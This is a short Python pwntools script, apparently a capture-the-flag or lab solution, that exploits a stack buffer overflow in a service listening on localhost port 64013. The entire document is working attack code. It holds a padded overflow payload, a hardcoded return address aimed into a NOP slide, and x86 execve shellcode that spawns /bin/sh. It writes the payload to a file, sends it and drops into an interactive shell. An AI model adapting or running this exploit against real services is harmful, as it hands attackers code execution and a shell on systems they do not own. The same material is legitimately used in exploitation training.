from pwn import *

arch = "i486"


def pad(s, slen):
    return s+b"A"*(slen-len(s))


HOST = "127.0.0.1"
PORT = 64013

io = remote(HOST, PORT)
io.recvline()


# 0xffffdb18 + 512 + 20 + +4 +  30 -> hit middle of nopslide
nop_slide_hitting_adr = pack(0xffffdd4e, 32)
overflow_padding = (5*4)*b"B"
nop_slide = b"\x90"*60
# shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = b""
payload += 512*b"A"
# pad until return pointer comes
payload += overflow_padding
payload += nop_slide_hitting_adr
payload += nop_slide
payload += shellcode

write("/tmp/docgil", payload)
io.sendline(payload)
r = io.interactive()
print(r)
